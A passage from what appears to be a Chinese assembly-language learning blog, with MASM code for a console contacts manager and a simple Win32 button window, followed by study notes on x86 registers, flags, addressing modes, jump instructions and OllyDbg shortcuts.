esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">call main;返回主菜单</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret</span><br><span class="line">FindData endp</span><br><span class="line"></span><br><span class="line">;修改数据</span><br><span class="line">ModifyData proc</span><br><span class="line">pop ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,050h</span><br><span class="line"></span><br><span class="line">;输入要查询的数据</span><br><span class="line">lea eax,g_szModifypri</span><br><span class="line">push eax</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,04h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea edi,[g_strTemContacts.szName];把结构体中名字的地址赋值给edi</span><br><span class="line">push edi;把名字的地址压入栈</span><br><span class="line">push offset g_szScanName;格式控制符</span><br><span class="line">call crt_scanf;调用接收字符的c语言函数</span><br><span class="line">add esp,08h;平栈</span><br><span class="line">push edi</span><br><span class="line">call crt_strlen</span><br><span class="line">pop edi</span><br><span class="line">mov [ebp-8],eax</span><br><span class="line"></span><br><span class="line">;根据输入的名字查询</span><br><span class="line">mov ecx,0h;初始化循环次数</span><br><span class="line">NEXT:</span><br><span class="line">cmp ecx,g_nCount;比较元素个数和0是否相等（循环完后即相等）</span><br><span class="line">jge EXIT</span><br><span class="line"></span><br><span class="line">lea edi,[g_strTemContacts.szName];把结构体名字的地址赋值给edi</span><br><span class="line"></span><br><span class="line">lea esi,[g_stConstacts.szName];把保存信息的结构体的地址赋值给esi</span><br><span class="line">mov eax,sizeof(CONTACTSSTRUCT);计算结构体大小</span><br><span class="line">imul eax,ecx;把结构体大小乘以结构体个数（得到总大小，就是结构体尾部插入数据的偏移量）</span><br><span class="line">add esi,eax;把这个偏移量给esi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;比较字符串</span><br><span class="line">mov eax,ecx;把循环次数给eax（元素个数）</span><br><span class="line">mov ecx,[ebp-8];初始化</span><br><span class="line">repe cmpsb BYTE ptr [esi], BYTE ptr[edi];esi存储的是结构体里的用户信息，edi是输入的信息，将这两个信息循环比较</span><br><span class="line">jz PRINTFINFO;如果相等就跳转（找到了）</span><br><span class="line">mov ecx,eax;把外循环次数还给ecx</span><br><span class="line">inc ecx;外循环次数加1</span><br><span class="line">jmp NEXT;继续外循环</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRINTFINFO:</span><br><span class="line">;输出查询结果</span><br><span class="line">;add esp,8h </span><br><span class="line">mov ecx,eax;循环</span><br><span class="line">lea esi,[g_stConstacts]</span><br><span class="line">mov ebx,sizeof(CONTACTSSTRUCT);计算结构体大小</span><br><span class="line">imul ebx,ecx;把结构体大小乘以结构体个数（得到总大小，就是结构体尾部插入数据的偏移量）</span><br><span class="line">add esi,ebx;把这个偏移量给esi(eax保存的是循环到底几次后找到的)</span><br><span class="line"></span><br><span class="line">lea ebx,[esi+CONTACTSSTRUCT.szName];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push ebx;</span><br><span class="line">push offset g_szScanName;</span><br><span class="line">call crt_printf;</span><br><span class="line">add esp,08h;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea eax,[esi+CONTACTSSTRUCT.szPhNumber];</span><br><span class="line">push eax;</span><br><span class="line">push offset g_szScanName;</span><br><span class="line">call crt_printf;</span><br><span class="line">add esp,08h;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea ebx,[esi+CONTACTSSTRUCT.szName]</span><br><span class="line">push ebx</span><br><span class="line">push offset g_szScanName</span><br><span class="line">call crt_scanf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea ebx,[esi+CONTACTSSTRUCT.szPhNumber]</span><br><span class="line">push ebx</span><br><span class="line">push offset g_szScanName</span><br><span class="line">call crt_scanf</span><br><span class="line"></span><br><span class="line">push offset strPause</span><br><span class="line">call crt_system</span><br><span class="line">add esp,04h </span><br><span class="line"></span><br><span class="line">EXIT:</span><br><span class="line"></span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">call main;返回主菜单</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ModifyData endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;删除数据</span><br><span class="line">RemoveData proc</span><br><span class="line">pop ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,050h</span><br><span class="line"></span><br><span class="line">;输入要查询的数据</span><br><span class="line">lea eax,g_szRemovepri</span><br><span class="line">push eax</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,04h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea edi,[g_strTemContacts.szName];把结构体中名字的地址赋值给edi</span><br><span class="line">push edi;把名字的地址压入栈</span><br><span class="line">push offset g_szScanName;格式控制符</span><br><span class="line">call crt_scanf;调用接收字符的c语言函数</span><br><span class="line">add esp,08h;平栈</span><br><span class="line">push edi</span><br><span class="line">call crt_strlen</span><br><span class="line">pop edi</span><br><span class="line">mov [ebp-8],eax</span><br><span class="line"></span><br><span class="line">;根据输入的名字查询</span><br><span class="line">mov ecx,0h;初始化循环次数</span><br><span class="line">NEXT:</span><br><span class="line">cmp ecx,g_nCount;比较元素个数和0是否相等（循环完后即相等）</span><br><span class="line">jge EXIT</span><br><span class="line"></span><br><span class="line">lea edi,[g_strTemContacts.szName];把结构体名字的地址赋值给edi</span><br><span class="line"></span><br><span class="line">lea esi,[g_stConstacts.szName];把保存信息的结构体的地址赋值给esi</span><br><span class="line">mov eax,sizeof(CONTACTSSTRUCT);计算结构体大小</span><br><span class="line">imul eax,ecx;把结构体大小乘以结构体个数（得到总大小，就是结构体尾部插入数据的偏移量）</span><br><span class="line">add esi,eax;把这个偏移量给esi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;比较字符串</span><br><span class="line">mov eax,ecx;把循环次数给eax（元素个数）</span><br><span class="line">mov ecx,[ebp-8];初始化</span><br><span class="line">repe cmpsb BYTE ptr [esi], BYTE ptr[edi];esi存储的是结构体里的用户信息，edi是输入的信息，将这两个信息循环比较</span><br><span class="line">jz PRINTFINFO;如果相等就跳转（找到了）</span><br><span class="line">mov ecx,eax;把外循环次数还给ecx</span><br><span class="line">inc ecx;外循环次数加1</span><br><span class="line">jmp NEXT;继续外循环</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRINTFINFO:</span><br><span class="line">;输出查询结果</span><br><span class="line">;add esp,8h </span><br><span class="line">mov ecx,eax;循环</span><br><span class="line">lea esi,[g_stConstacts]</span><br><span class="line">mov ebx,sizeof(CONTACTSSTRUCT);计算结构体大小</span><br><span class="line">imul ebx,ecx;把结构体大小乘以结构体个数（得到总大小，就是结构体尾部插入数据的偏移量）</span><br><span class="line">add esi,ebx;把这个偏移量给esi(eax保存的是循环到底几次后找到的)</span><br><span class="line"></span><br><span class="line">lea ebx,[esi+CONTACTSSTRUCT.szName];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push ebx;</span><br><span class="line">push offset g_szScanName;</span><br><span class="line">call crt_printf;</span><br><span class="line">add esp,08h;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea eax,[esi+CONTACTSSTRUCT.szPhNumber];</span><br><span class="line">push eax;</span><br><span class="line">push offset g_szScanName;</span><br><span class="line">call crt_printf;</span><br><span class="line">add esp,08h;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push offset g_szRemovestr</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,04h </span><br><span class="line"></span><br><span class="line">mov [esi+CONTACTSSTRUCT.szPhNumber],0</span><br><span class="line">mov [esi+CONTACTSSTRUCT.szName],0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXIT:</span><br><span class="line"></span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">call main;返回主菜单</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">RemoveData endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;保存数据</span><br><span class="line">SaveData proc</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,30h</span><br><span class="line"></span><br><span class="line">push offset wb</span><br><span class="line">push offset FilePath</span><br><span class="line">call crt_fopen</span><br><span class="line">mov [ebp-8],eax</span><br><span class="line">add esp,8h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push [ebp-8];文件指针</span><br><span class="line">push 1</span><br><span class="line">push 4</span><br><span class="line">lea ecx,g_nCount</span><br><span class="line">push ecx</span><br><span class="line">call crt_fwrite;文件写入函数</span><br><span class="line">add esp,16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push [ebp-8];结构体指针</span><br><span class="line">mov eax,sizeof(CONTACTSSTRUCT);计算结构体大小</span><br><span class="line">push g_nCount;单个大小</span><br><span class="line">push  eax;元素个数</span><br><span class="line">push offset g_stConstacts;文件指针</span><br><span class="line">call crt_fwrite;文件写入函数</span><br><span class="line"></span><br><span class="line">add esp,10h</span><br><span class="line"></span><br><span class="line">push [ebp-8]</span><br><span class="line">call crt_fclose</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">push offset Save</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call SwitchCase</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">SaveData endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;读取数据</span><br><span class="line">ReadData proc</span><br><span class="line"></span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,30h</span><br><span class="line"></span><br><span class="line">push offset rb</span><br><span class="line">push offset FilePath</span><br><span class="line">call crt_fopen</span><br><span class="line">mov [ebp-8],eax</span><br><span class="line">add esp,8h</span><br><span class="line">cmp eax,0</span><br><span class="line">jz tiao</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push [ebp-8];文件指针</span><br><span class="line">push 1 </span><br><span class="line">push 4</span><br><span class="line">push offset g_nCount</span><br><span class="line">call crt_fread;文件写入函数</span><br><span class="line">add esp,16</span><br><span class="line"></span><br><span class="line">;call crt_fread;文件写入函数</span><br><span class="line">;add esp,16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push [ebp-8];结构体指针</span><br><span class="line">mov eax,sizeof(CONTACTSSTRUCT);计算结构体大小</span><br><span class="line">push offset g_nCount;单个大小</span><br><span class="line">push  eax;元素个数</span><br><span class="line">push offset g_stConstacts;文件指针</span><br><span class="line">call crt_fread;文件写入函数</span><br><span class="line"></span><br><span class="line">add esp,16</span><br><span class="line"></span><br><span class="line">push [ebp-8]</span><br><span class="line">call crt_fclose</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tiao:</span><br><span class="line"></span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">call MenuShell</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">ReadData endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;入口函数main</span><br><span class="line">.code</span><br><span class="line">main:</span><br><span class="line">call ReadData</span><br><span class="line">call MenuShell</span><br><span class="line">call SwitchCase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">end main</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="简单的窗口程序，带个按钮"><a href="#简单的窗口程序，带个按钮" class="headerlink" title="简单的窗口程序，带个按钮"></a>简单的窗口程序，带个按钮</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line">include windows.inc </span><br><span class="line">include user32.inc </span><br><span class="line">includelib user32.lib            ; calls to functions in user32.lib and kernel32.lib </span><br><span class="line">include kernel32.inc </span><br><span class="line">includelib kernel32.lib </span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </span><br><span class="line"></span><br><span class="line">.DATA                     ; initialized data </span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0        ; the name of our window class </span><br><span class="line">AppName db &quot;Our First Window&quot;,0        ; the name of our window </span><br><span class="line">szButton             db    &#39;button&#39;,0</span><br><span class="line"></span><br><span class="line">szButtonText      db    &#39;点我&#39;,0</span><br><span class="line">StringShow   db &#39;被点击了&#39;,0</span><br><span class="line">.DATA?                ; Uninitialized data </span><br><span class="line">hInstance HINSTANCE ?        ; Instance handle of our program </span><br><span class="line">CommandLine LPSTR ? </span><br><span class="line">.CODE                ; Here begins our code </span><br><span class="line">start: </span><br><span class="line">invoke GetModuleHandle, NULL            ; get the instance handle of our program. </span><br><span class="line">                                                                       ; Under Win32, hmodule&#x3D;&#x3D;hinstance mov hInstance,eax </span><br><span class="line">mov hInstance,eax </span><br><span class="line">invoke GetCommandLine                        ; get the command line. You don&#39;t have to call this function IF </span><br><span class="line">                                                                       ; your program doesn&#39;t process the command line. </span><br><span class="line">mov CommandLine,eax </span><br><span class="line">invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT        ; call the main function </span><br><span class="line">invoke ExitProcess, eax                           ; quit our program. The exit code is returned in eax from WinMain. </span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX                                            ; create local variables on stack </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line"></span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX                   ; fill values in members of wc </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInstance </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc                       ; register our window class </span><br><span class="line">    invoke CreateWindowEx,NULL,\ </span><br><span class="line">                ADDR ClassName,\ </span><br><span class="line">                ADDR AppName,\ </span><br><span class="line">                WS_OVERLAPPEDWINDOW,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                NULL,\ </span><br><span class="line">                NULL,\ </span><br><span class="line">                hInst,\ </span><br><span class="line">                NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">     invoke CreateWindowEx,NULL,\</span><br><span class="line"></span><br><span class="line">                               offset szButton,offset szButtonText,\</span><br><span class="line"></span><br><span class="line">                              WS_CHILD or WS_VISIBLE,\</span><br><span class="line"></span><br><span class="line">                             500,500,100,40,\</span><br><span class="line"></span><br><span class="line">                             hwnd,1,hInst,NULL</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    invoke ShowWindow, hwnd,CmdShow               ; display our window on desktop </span><br><span class="line">    invoke UpdateWindow, hwnd                                 ; refresh the client area </span><br><span class="line"></span><br><span class="line">    .WHILE TRUE                                                         ; Enter message loop </span><br><span class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">                .BREAK .IF (!eax) </span><br><span class="line">                invoke TranslateMessage, ADDR msg </span><br><span class="line">                invoke DispatchMessage, ADDR msg </span><br><span class="line">   .ENDW </span><br><span class="line">    mov     eax,msg.wParam                                            ; return exit code in eax </span><br><span class="line">    ret </span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </span><br><span class="line">    .IF uMsg&#x3D;&#x3D;WM_DESTROY                           ; if the user closes our window </span><br><span class="line">        invoke PostQuitMessage,NULL  ; quit our application </span><br><span class="line">        </span><br><span class="line">    .ELSEIF uMsg&#x3D;&#x3D;WM_COMMAND </span><br><span class="line">    </span><br><span class="line">    invoke MessageBox,hWnd,offset StringShow,0,0       </span><br><span class="line">    .ELSE </span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam     ; Default message processing </span><br><span class="line">        ret </span><br><span class="line">    .ENDIF </span><br><span class="line">    xor eax,eax </span><br><span class="line">    ret </span><br><span class="line">WndProc endp </span><br><span class="line"></span><br><span class="line">end start </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言————基础</title>
      <link href="2020/12/05/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
      <url>2020/12/05/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>补码：等于源码取反再加1</p><h1 id="基础知识点"><a href="#基础知识点" class="headerlink" title="基础知识点"></a>基础知识点</h1><ul><li><h2 id="8086CPU地址总线有多少根？"><a href="#8086CPU地址总线有多少根？" class="headerlink" title="8086CPU地址总线有多少根？"></a>8086CPU地址总线有多少根？</h2><ul><li>20根，2^20 = 1MB</li></ul></li></ul><ul><li><h2 id="汇编指令的格式，有哪些构成"><a href="#汇编指令的格式，有哪些构成" class="headerlink" title="汇编指令的格式，有哪些构成"></a>汇编指令的格式，有哪些构成</h2><ul><li>操作码，操作数<ul><li>内存</li><li>寄存器</li><li>立即数</li></ul></li></ul></li></ul><ul><li><h2 id="8086寄存器有哪些，"><a href="#8086寄存器有哪些，" class="headerlink" title="8086寄存器有哪些，"></a>8086寄存器有哪些，</h2><ul><li>AX,BX,CX,DX, AH,AL, BH,BL,CH,CL,DH,DL</li><li>SI,DI</li><li>SP,BP</li><li>IP</li><li>FLAGS</li><li>CS,DS,ES,SS</li></ul></li><li><h2 id="80386的呢？"><a href="#80386的呢？" class="headerlink" title="80386的呢？"></a>80386的呢？</h2><ul><li>EAX,EBX,ECX,EDX</li><li>ESP,EBP</li><li>ESI,EDI</li><li>EIP</li><li>EFLAGS</li><li>CS,DS,ES,SS,FS,GS</li></ul></li><li><h2 id="标志寄存器有哪些位？"><a href="#标志寄存器有哪些位？" class="headerlink" title="标志寄存器有哪些位？"></a>标志寄存器有哪些位？</h2><ul><li>CF:进位(借位)标志</li><li>OF: 溢出标志</li><li>ZF: 零标志</li><li>SF: 符号</li><li>PF:奇偶</li><li>AF:辅助进位</li><li>DF:方向标志</li><li>TF:陷阱标志</li><li>IF：中断标志</li></ul></li></ul><ul><li><h2 id="8086为什么有分段机制？"><a href="#8086为什么有分段机制？" class="headerlink" title="8086为什么有分段机制？"></a>8086为什么有分段机制？</h2></li><li><p>逻辑地址和物理地址如何表示？</p><ul><li>操作大小是16位，地址总线20根，能访问内存1MB<ul><li>逻辑地址：段基址：偏移</li><li>物理地址：段基址 * 16 +偏移</li></ul></li></ul></li></ul><h2 id="寻址方式有哪些？"><a href="#寻址方式有哪些？" class="headerlink" title="寻址方式有哪些？"></a>寻址方式有哪些？</h2><p>立即数寻址： mov eax, 0x10000 </p><p>寄存器寻址： mov eax, ebx </p><p>存储器寻址： mov eax, [xxxxxx] </p><p>直接寻址: mov eax,[0x1000] </p><p>寄存器间接寻址： mov eax,[esi] </p><p>相对寄存器寻址： mov eax,[esi + 08] </p><p>基址变址寻址： mov eax ,[ebx + esi] </p><p>相对基址变址寻址： mov eax,[ebx+esi+0x80] </p><p>带比例存储器寻址： mov eax,[ebx+esi*4+0x80] </p><h2 id="串操作有哪些？"><a href="#串操作有哪些？" class="headerlink" title="串操作有哪些？"></a>串操作有哪些？</h2><p> movsb/w/d :</p><p> 将原操作数 DS:[ESI] 拷贝到 ES:[EDI],根据DF来设置地址递增或递减 stosb/w/d :将al,ax,eax,填充到目的 ES:[EDI],根据DF来设置地址递增或递减</p><p> cmpsb/w/d :</p><p> 将原操作数 DS:[ESI] 和目标ES:[EDI]比较 </p><p>loadsb/w/d: </p><p>将DS:[ESI]指向内容拷贝到al,ax,eax rep : 与movs/stos/loads 结合使用，ecx作为循环次数 repe/repne：</p><p>cmps,scas,除了判断ecx是否为0，判断zf位</p><h2 id="cmp指令的作用"><a href="#cmp指令的作用" class="headerlink" title="cmp指令的作用?"></a>cmp指令的作用?</h2><p>cmp eax, 5 </p><p>将操作数1 - 操作数2 设置EFLAGS,丢弃结果 判断两个数相等，ZF 是否为1 </p><p>无符号大小：</p><p> 看CF是否有借位，如果CF=1,操作1 &lt;操作数2 </p><p>有符号大小：</p><p>看OF是否有溢出，有溢出SF需要取反，最后看SF,SF=1 ,操作1 &lt;操作数2</p><h2 id="jcc指令有哪些？"><a href="#jcc指令有哪些？" class="headerlink" title="jcc指令有哪些？"></a>jcc指令有哪些？</h2><p> je/jz : 相等跳转 (zf) </p><p>jne/jnz: 不相等跳转(zf)</p><p>ja: 大于跳转 （CF）</p><p> jb: 小于跳转 （CF） </p><p>jg: 大于跳转 （OF==SF）</p><p> jge:大于等于跳转</p><h2 id="OD中快捷键"><a href="#OD中快捷键" class="headerlink" title="OD中快捷键"></a>OD中快捷键</h2><ul><li>CTRL + B ：二进制搜索</li><li>CTRL + S ：多条指令搜索</li><li>CTRL +F9 ：运行到返回（ret）</li><li>CTRL + X : 复制地址</li><li>F7 ： 单步步入</li><li>F8： 单步步过</li><li>F9： 运行</li></ul><h2 id="在函数中，打开堆栈后，堆栈的布局是怎么样的？"><a href="#在函数中，打开堆栈后，堆栈的布局是怎么样的？" class="headerlink" title="在函数中，打开堆栈后，堆栈的布局是怎么样的？"></a>在函数中，打开堆栈后，堆栈的布局是怎么样的？</h2><ul><li>参数在什么位置 [ebp + 8]</li><li>返回地址什么位置 [ebp+4]</li><li>局部变量什么位置 [ebp- xx]</li></ul><h1 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h1><h2 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h2><p>（1） 是CPU与内存或其他器件之间的数据传送的通道。</p><p>（2）数据总线的宽度决定了CPU和外界的数据传送速度。</p><p>（3）每条传输线一次只能传输1位二进制数据。8根数据线一次可传送一个8位二进制数据(即一个字节)。</p><p>（4）数据总线是数据线数量之和。</p><p>数据总线数据总线是CPU与存储器、CPU与I/O接口设备之间传送数据信息(各种指令数据信息)的总线，这些信号通过数据总线往返于CPU与存储器、CPU与I/O接口设备之间，因此，数据总线上的信息是双向传输的。</p><h2 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h2><p>（1）CPU是通过地址总线来指定存储单元的。</p><p>（2）地址总线决定了cpu所能访问的最大内存空间的大小。10根地址线能访问的最大的内存为1024位二进制数据（1024个内存单元）(1B)</p><p>（3）地址总线是地址线数量之和。</p><p>地址总线（ Address Bus）是一种计算机总线，是CPU或有DMA能力的单元，用来沟通这些单元想要访问（读取/写入）计算机内存组件/地方的物理地址。 它是单向的，只能从CPU传向外部 存储器 或I/O端口</p><p>有个说法：64位CPU装了64位操作系统，最大物理内存理论上=2的64次方；然而实际上地址总线只用到了35位，所以最大物理内存是32G大小</p><h2 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h2><p>（1）CPU通过控制总线对外部器件进行控制。</p><p>（2）控制总线的宽度决定了CPU对外部器件的控制能力。</p><p>控制总线，英文名称：ControlBus，简称：CB。控制总线主要用来传送控制信号和时序信号。控制信号中，有的是微处理器送往存储器和输入输出设备接口电路的，如读/写信号，片选信号、中断响应信号等；也有是其它部件反馈给CPU的</p><p>总结：如果CPU要读取内存中的某个数据的话、、、</p><p>​    先通过地址总线知道这个数据在哪，然后通过控制总线跟内存说我要都这个数据，然后通过数据总线进行传输读取</p><h1 id="基础汇编之寄存器"><a href="#基础汇编之寄存器" class="headerlink" title="基础汇编之寄存器"></a>基础汇编之寄存器</h1><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><h3 id="数据寄存器"><a href="#数据寄存器" class="headerlink" title="数据寄存器"></a>数据寄存器</h3><p>8086的16位通用寄存器是AX，BX，CX，DX，SI，DI，BP，SP，其中前四个数据寄存器都还可以分成高8位和低8位两个独立的寄存器，</p><p>8086的8位通用寄存器是AH，BH，CH，DH，AL，BL，CL，DL，其中某个8位的操作，并不影响另外对应的8位数据</p><h3 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h3><p>指针寄存器用于寻址内堆栈的数据</p><p>SP为堆栈指针寄存器，指示栈顶的偏移地址</p><p>SP不能用于其它目的</p><p>BP为基址指针寄存器，表示数据在堆栈段中的基地址</p><p>SP和BP寄存器与SS段寄存器联合使用用以确定堆栈中的存储单元地址</p><h3 id="变址寄存器"><a href="#变址寄存器" class="headerlink" title="变址寄存器"></a>变址寄存器</h3><p>变址寄存器常用于存储器寻址时提供地址</p><p>​    SI是源变址寄存器（Source）</p><p>​    DI是目的变址寄存器（Destination）</p><h3 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h3><p>指令指针寄存器IP，它与代码段寄存器CS联用，用远存储的是即将执行的指令地址，每执行完一条指令，CPU会根据CS：IP找到下一条指令，同时IP会被赋值为下一条指令的地址</p><p>计算机通过CS：IP寄存器来控制指令序列的执行流程</p><p>IP寄存器是一个专用寄存器，不能被直接赋值修改</p><h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" 